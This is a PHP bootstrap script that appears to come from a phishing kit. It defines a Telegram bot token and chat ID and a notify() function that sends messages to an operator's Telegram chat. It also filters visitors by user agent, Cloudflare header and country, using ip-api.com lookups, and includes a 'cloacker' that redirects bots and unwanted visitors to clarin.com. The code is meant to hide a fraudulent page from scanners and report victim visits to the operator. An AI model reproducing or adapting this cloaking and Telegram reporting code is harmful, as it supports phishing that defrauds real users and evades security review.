<?php

    $token = "";
    $chatId = "";

    // -- alertar visita de cliente
    $userAlert = false;

    // -- only allow cloudfare
    $cloudfareEnabled = false;

    // -- only permit the next userAgents
    $userAgentEnabled = true;

    // -- enabled antibot
    $antibotEnabled = false;

    // -- out url
    $urlOut = "/";

    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $allowedUserAgents = [
        'Mozilla',
        'Chrome',
        'Safari',
        'Firefox',
        'Edge',
        'Opera'
    ];

    // -- true: then the script use the array list country
    $activeCloacker = false;
    $allowedCountries = [];

    // DONT TOUCH THE NEXT CODE

    // params option
    define("BOT_TOKEN", $token); // bot token
    define("CHAT_ID", $chatId); // telegram chat id

    define("URL_REDIRECT", $urlOut);

    define("CONTROL_MAX_REQUESTS", 1); // max user request

    define("BOT_URL_REDIRECT", "https://clarin.com");

    define("RANDOM_NAME", "app_shadown39928");
    define("DIRECT_CALL", true);

    define("APP_NAME", "SCOKT");
        
    define("ALERT", $userAlert);
    define("RQM", strtolower($_SERVER["REQUEST_METHOD"]));
    

    function getIP(){
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
       }
       elseif(isset($_SERVER["HTTP_CLIENT_IP"])) {
           $ip = $_SERVER["HTTP_CLIENT_IP"];
       }
       elseif(isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
           $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
       }
       elseif(isset($_SERVER["HTTP_X_FORWARDED"])) {
           $ip = $_SERVER["HTTP_X_FORWARDED"];
       }
       elseif(isset($_SERVER["HTTP_FORWARDED_FOR"])) {
           $ip = $_SERVER["HTTP_FORWARDED_FOR"];
       }
       elseif(isset($_SERVER["HTTP_FORWARDED"])) {
           $ip = $_SERVER["HTTP_FORWARDED"];
       }
       else {
           $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : false;
       }
       if ($ip === '::1') {
           $ip = '127.0.0.1';
       }
       return $ip;
    }

    // sendData to telegram
    function notify($title, $msg, $pinMessage = false) {

        $apiToken = BOT_TOKEN;

        $url = "https://api.telegram.org/bot$apiToken/sendMessage";

        $params = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query([
                    'chat_id' => CHAT_ID,
                    'text' => $msg,
                    'parse_mode' => 'HTML',
                ]),
            ],
        ];

        $context = stream_context_create($params);
        $result = @file_get_contents($url, false, $context);

        if ($result === FALSE) {

        } else {
            if (!$pinMessage) return;
            $response = json_decode($result, true);
            $message_id = $response['result']['message_id'];
            $pin_url = "https://api.telegram.org/bot" . BOT_TOKEN . "/pinChatMessage";

            $pin_params = [
                'http' => [
                    'method' => 'POST',
                    'header' => 'Content-type: application/x-www-form-urlencoded',
                    'content' => http_build_query(['chat_id' => CHAT_ID, 'message_id' => $message_id]),
                ],
            ];

            $pin_context = stream_context_create($pin_params);
            $pin_result = file_get_contents($pin_url, false, $pin_context);

            if ($pin_result === false) {}
            
        }
    }

    function startsWithAny($string, $options) {

        foreach ($options as $option) {
            if (strpos($string, $option) === 0) {
                return true;
            }
        }
        return false;
    }

    // calling intial function
    function executeInitialTasks() {
       global $userAgentEnabled, $userAgent, $allowedUserAgents, $allowedCountries, $cloudfareEnabled, $activeCloacker;
        // -- check user agents tasks
        if ($userAgentEnabled && !startsWithAny($userAgent, $allowedUserAgents))
          // -- if request doesn'y work then load 403 custom webpage
          exit(file_get_contents('403.html'));

        // -- check if cloudfare is active
        if ($cloudfareEnabled && !isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
          header("Location: 403.html");
          exit;
        }

        $ip = $cloudfareEnabled ? $_SERVER['HTTP_CF_CONNECTING_IP'] : getIP();
        $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");
        $countryCode = @json_decode($data, true)['countryCode'] ?? '';

        if ($activeCloacker && !in_array($countryCode, $allowedCountries)) {
            exit(header(
                "location: " . BOT_URL_REDIRECT
            ));
        }

    }

    executeInitialTasks();
?>